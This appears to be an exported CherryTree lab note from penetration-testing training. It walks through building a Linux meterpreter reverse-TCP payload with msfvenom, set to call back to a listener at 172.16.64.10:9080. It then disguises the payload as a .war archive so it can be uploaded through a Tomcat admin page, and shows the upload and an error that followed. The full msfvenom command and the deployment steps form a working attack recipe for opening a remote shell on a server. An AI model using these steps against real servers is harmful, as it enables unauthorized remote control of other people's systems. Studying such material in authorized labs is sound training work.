<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>build webshell with msfvenom</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>build webshell with msfvenom</h1><br/><br /><strong><h3>Build webshell</h3></strong><h3> </h3><strong><h3>payload</h3></strong><br /> <div class="codebox"><div class="codebox">msfvenom&nbsp;-p&nbsp;linux/x64/meterpreter_reverse_tcp&nbsp;lhost=172.16.64.10&nbsp;lport=9080&nbsp;-f&nbsp;elf&nbsp;-o&nbsp;meterpreterFile</div></div><br />-p, --payload → Payload to use, must be the same of the on used on the attacker machine<br />-f, --format → Output format<br />    <a href=""><img src="images/452-1.png" alt="images/452-1.png" /></a><br />-o, --out → Save the payload in a output file<br /><br /><br /><strong><h3>rename the webshell payload to a .war file</h3></strong><br />now we have to rename the payload, by appending a war extension at the end. The structure of the file will not change will allow us to upload it to the tomcat server; as it will think it is a deployable .war archive<br /><div class="codebox"><div class="codebox">mv&nbsp;meterpreterFile&nbsp;meterpreterFile.war</div></div><br /><br /><strong><h3>deploy the webshell(payload) created in the admin page</h3></strong><br /><a href="file://C:/CherryTree/screenshot/Black Boxes/webshell-msfvenom-tomcat3.png"><img src="images/452-2.png" alt="images/452-2.png" /></a><br />after deployed we can find it here:<br /><a href="file://C:/CherryTree/screenshot/Black Boxes/webshell-msfvenom-tomcat4.png"><img src="images/452-3.png" alt="images/452-3.png" /></a><br />but start it give us an error like this:<br /><a href="file://C:/CherryTree/screenshot/Black Boxes/error1.png"><img src="images/452-4.png" alt="images/452-4.png" /></a><br />because meterpreterFile.war is not a real .war file, to use this webshell we have to rename it to its original form, simply meterpreterFile, without .war<br /><br /><br /> cannot &quot;cd&quot; in a non-interactive webshell. In the lab manual we use only &quot;ls&quot; for that reason.</div>
</body>
</html>
